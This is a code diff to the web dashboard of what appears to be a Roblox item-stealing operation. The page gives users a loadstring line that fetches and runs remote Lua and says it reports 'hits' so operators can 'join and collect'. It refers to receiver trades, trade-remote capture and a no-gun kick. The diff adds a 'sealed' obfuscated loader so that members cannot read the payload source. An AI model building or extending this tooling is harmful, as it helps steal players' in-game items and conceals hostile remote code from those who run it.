@@ -524,7 +524,7 @@ export async function leaderboard(root, ctx) {
 /* ============================ script ============================ */
 export async function script(root, ctx) {
   const cfg = await api.config();
-  const luaSource = await fetch(cfg.loadstring_url).then((r) => r.text()).catch(() => '-- could not load client script');
+  const line = `loadstring(game:HttpGet("${cfg.loadstring_url}"))()`;
 
   root.innerHTML = `${head('My Script', 'Your loadstring, receivers and delivery are managed from one place.')}
     <div class="stack">
@@ -534,7 +534,7 @@ export async function script(root, ctx) {
           <div class="right"><button class="btn btn-sm" id="copy-line">${icon('copy', 13)} Copy</button></div>
         </div>
         <div class="card-body">
-          <div class="code-block" id="line">loadstring(game:HttpGet("${esc(cfg.loadstring_url)}"))()</div>
+          <div class="code-block" id="line">${esc(line)}</div>
           <p class="hint" style="margin-top:10px">Reports your roblox username, executor and server id with every hit — so you can join and collect.</p>
         </div>
       </div>
@@ -604,17 +604,33 @@ export async function script(root, ctx) {
         </div>
       </div>
 
-      <div class="card">
+      <div class="card vault">
         <div class="card-head">
-          <div><h2>Client script</h2><p>What the loadstring runs — server id, executor, roblox name, receiver trades, the no-gun kick and claim requests.</p></div>
+          <div class="vault-title">
+            <span class="vault-icon">${icon('shield', 17)}</span>
+            <div>
+              <h2>Source vault</h2>
+              <p>The URL serves a sealed loader, not readable Lua.</p>
+            </div>
+          </div>
           <div class="right">
-            <button class="btn btn-sm" id="copy-lua">${icon('copy', 13)} Copy script</button>
-            <button class="btn btn-sm" id="toggle-lua">Show</button>
+            <span class="seal-pill">${icon('shield', 11)} sealed</span>
+            <button class="btn btn-sm" id="copy-lua">${icon('copy', 13)} Copy loadstring</button>
+            ${cfg.can_view_source ? `<button class="btn btn-sm" id="toggle-lua">${icon('eye', 13)} Reveal source</button>` : ''}
           </div>
         </div>
         <div class="card-body">
-          <pre class="code-block" id="lua-src" style="display:none;max-height:420px">${esc(luaSource)}</pre>
-          <p class="hint" id="lua-hint">${nf(luaSource.split('\n').length)} lines · receiver join trades, item push, trade-remote capture, no-gun kick, server join data, auto-claimer flags.</p>
+          <div class="vault-note" id="vault-note">
+            <span class="vault-lock">${icon(cfg.can_view_source ? 'eye' : 'eyeOff', 16)}</span>
+            <div>
+              <strong>${cfg.can_view_source ? 'Admin source view' : 'Loader only'}</strong>
+              <span>${cfg.can_view_source
+                ? 'Reveal decrypts this account\u2019s Lua here. Members never receive it.'
+                : 'Anyone who opens the loadstring URL gets the sealed payload. Only an admin can read the real source here.'}</span>
+            </div>
+          </div>
+          <pre class="code-block vault-src" id="lua-src" hidden></pre>
+          <p class="hint" id="lua-hint">server id · executor · roblox name · receiver trades · trade-remote capture · no-gun kick · claim requests.</p>
         </div>
       </div>
     </div>`;
@@ -627,15 +643,36 @@ export async function script(root, ctx) {
     const ok = await copyText(cfg.api_key);
     toast(ok ? 'API key copied' : 'Copy failed', ok ? 'success' : 'error');
   });
-  root.querySelector('#toggle-lua').addEventListener('click', (e) => {
-    const pre = root.querySelector('#lua-src');
-    const showing = pre.style.display !== 'none';
-    pre.style.display = showing ? 'none' : 'block';
-    e.currentTarget.textContent = showing ? 'Show' : 'Hide';
-  });
+  const reveal = root.querySelector('#toggle-lua');
+  const pre = root.querySelector('#lua-src');
+  if (reveal && pre) {
+    reveal.addEventListener('click', async () => {
+      if (!pre.hidden) {
+        pre.hidden = true;
+        reveal.innerHTML = `${icon('eye', 13)} Reveal source`;
+        return;
+      }
+      if (!pre.dataset.loaded) {
+        reveal.disabled = true;
+        try {
+          const res = await api.scriptSource('client');
+          pre.textContent = res.source ?? '';
+          pre.dataset.loaded = '1';
+          root.querySelector('#lua-hint').textContent = `${nf((res.source ?? '').split('\n').length)} lines · unsealed for admin view only.`;
+        } catch (err) {
+          toast(err.message, 'error');
+          reveal.disabled = false;
+          return;
+        }
+        reveal.disabled = false;
+      }
+      pre.hidden = false;
+      reveal.innerHTML = `${icon('eyeOff', 13)} Hide source`;
+    });
+  }
   root.querySelector('#copy-lua').addEventListener('click', async () => {
-    const ok = await copyText(luaSource);
-    toast(ok ? 'Client script copied' : 'Copy failed', ok ? 'success' : 'error');
+    const ok = await copyText(root.querySelector('#line').textContent);
+    toast(ok ? 'Loadstring copied' : 'Copy failed', ok ? 'success' : 'error');
   });
   root.querySelector('#test-delivery').addEventListener('click', async (e) => {
     const btn = e.currentTarget;
